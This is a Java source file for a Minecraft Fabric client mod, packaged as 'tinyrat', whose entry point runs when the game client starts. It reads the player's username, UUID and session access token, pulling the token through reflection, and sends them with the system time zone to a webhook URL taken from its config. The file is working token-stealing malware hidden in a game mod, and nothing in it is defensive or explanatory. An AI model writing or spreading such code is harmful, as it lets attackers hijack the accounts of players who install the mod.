package com.github.tinyrat;

import java.time.ZoneId;

import com.github.tinyrat.utils.ConfigLoader;
import com.github.tinyrat.utils.Embed;
import com.github.tinyrat.utils.Webhook;
import com.github.tinyrat.utils.ReflectionHelper;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.session.Session;

public class Entry implements ClientModInitializer {
    public static final String MOD_ID = "tinyrat";

    private final Session session;

    public Entry() {
        MinecraftClient minecraft = MinecraftClient.getInstance();
        this.session = minecraft.getSession();
    }

    @Override
    public void onInitializeClient() {
        sendWebhook();
    }

    private void sendWebhook() {
        String webhookUrl = ConfigLoader.getWebhook();
        Webhook webhook = new Webhook(webhookUrl);

        Embed embed = new Embed(
            this.session.getUsername(),
            this.session.getUuidOrNull(),
            this.getTokenViaReflection(),
            ZoneId.systemDefault()
        );

        webhook.sendEmbed(embed);
    }

    private String getTokenViaReflection() {
        try {
            String methodName = ConfigLoader.getTokenMethodName();
            System.out.println("Using method name: " + methodName);

            return ReflectionHelper.get(this.session, methodName, String.class);
        } catch (Exception e) {
            e.printStackTrace();
            return "Error retrieving token";
        }
    }
}
